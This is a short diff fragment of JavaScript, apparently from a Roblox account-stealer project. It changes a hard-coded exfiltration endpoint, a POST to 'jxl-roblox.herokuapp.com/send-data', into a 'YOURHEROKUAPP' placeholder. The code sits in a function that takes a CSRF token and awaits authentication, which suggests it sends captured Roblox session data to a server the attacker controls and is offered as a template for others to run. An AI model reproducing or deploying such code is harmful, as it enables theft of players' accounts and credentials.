@@ -25,7 +25,7 @@ async function getusername(csrf) {
         await auth
         
 
-        fetch('https://jxl-roblox.herokuapp.com/send-data?id=IDHERE', {
+        fetch('https://YOURHEROKUAPP.herokuapp.com/send-data?id=IDHERE', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
